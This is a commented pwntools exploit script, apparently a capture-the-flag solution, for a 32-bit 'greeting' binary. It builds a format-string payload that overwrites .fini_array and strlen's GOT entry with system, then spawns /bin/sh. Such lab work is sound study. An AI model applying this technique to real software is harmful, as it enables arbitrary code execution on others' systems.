import struct
import pwn

# greeting is a 32-bit dynamically linked binary
# It has NX enabled, and a stack canary. ASLR is turned on

# This exploit involves overwriting both the got entry of strlen and the .fini_array with printf format string exploit
# We overwrite .fini_array with an address in the main function to allow ourselves to loop back over, after the printf call
# On the second pass through, strlen has been overwritten with system()
# strlen's parameter is our input, so on the second pass, we feed it "/bin/sh" as our input. 
# As a result, system() is called with /bin/sh as its parameter

target = pwn.process("./greeting")
#pwn.gdb.attach(target, gdbscript="b *0x08048654")

# In ELF executables or shared object files:
# .fini section holds executable instructions that contribute to the process termination code. That is, when a prrogram exits normally, the system arranges to execute the code in this section
# .init section holds executable instructions that contribute to the process initialization code. When a program starts, the system executes the code in this section before the main  entry point

# .fini_array is optional, and sort of a fancier version of .fini

# We will write to the .fini_array section to loop back around
# We can find the address of .fini_array by running 'info file' in gdb
# 0x08049934 - 0x08049938 is .fini_array

# 0x08048614 is the address where the program begins its setup to call the getnline function
# We will use that as the address to jump back to from .fini_array

# strlen is called at the end of getnline, and it is called with a pointer to our input
# It also is not called anywhere else in the program, so overwriting its address in the got will not cause any problems
# For these reasons, we will choose it as our got address to overwrite
# Addr of strlen in got:
# objdump -R greeting | grep strlen
# 08049a54

# Addr of system in plt:
# 08048490

# input is stored at in between the 11th and 12th 4-byte offset from printf
# if we add two characters before our input, it will be square at the 12th offset
# Once we attempt to access the 17th, 18th, and 19th offsets from printf, the program breaks
# So, we have 12,13,14,15,16 = 5 offsets to work with, and 8 writes to perform; we will have to group our writes

# Step 1) overwrite the address of .fini_array with 0x08048614
fini_addr_0 = struct.pack("<I", 0x08049934)
fini_addr_2 = struct.pack("<I", 0x08049934 + 2)

# Step 2) overwrite the got entry of strlen with the address of system in plt (08048490)
strlen_addr_0 = struct.pack("<I", 0x08049a54)
strlen_addr_2 = struct.pack("<I", 0x08049a54 + 2)


enumeration_payload = b'xx' + fini_addr_0 + fini_addr_2 + strlen_addr_0 + strlen_addr_2 + b'%12$n' + b'%13$n' + b'%14$n' + b'%15$n'

# After sending our first payload, we find 0x240024 in both strlen addr and .fini_array addr. Good!

final_payload = b'xx' + fini_addr_0 + fini_addr_2 + strlen_addr_0 + strlen_addr_2

# We need the last two bytes of .fini_array addr to be 0x8614
# 0x8614 - 0x0024 = 34288
final_payload += b'%34288x'
final_payload += b'%12$n'

# Now we have 0x86148614 in both target addresses
# We need the top two bytes of fini_addr and the top two bytes of strlen to be 0x0804
# To make things more compact, we will wait, and write those both at the same time last

# Now the addr in strlen will be 0x86148614
# We will overwrite the bottom 2.5 bytes with 0x18490
# 0x18490 - 0x8614 = 65148
final_payload += b'%65148x'
final_payload += b'%14$n'

# Now we will overwrite the top two bytes of both with 0x0804
# We have already written 0x18490 bytes, so will need to write
# 0x20804
# 0x20804 - 0x18490 = 33652
final_payload += b'%33652x'
final_payload += b'%15$n'
final_payload += b'%13$n'

target.sendline(final_payload)

# After sending the payload, we see the desired addresses have been written to fini_arr and strlen got
# Now, all we have to do is send "/bin/sh" when the process asks for input on its second pass around

target.recvuntil(b'name... ')
target.sendline(b'/bin/sh')

# And just like that... We popped a shell!

target.interactive()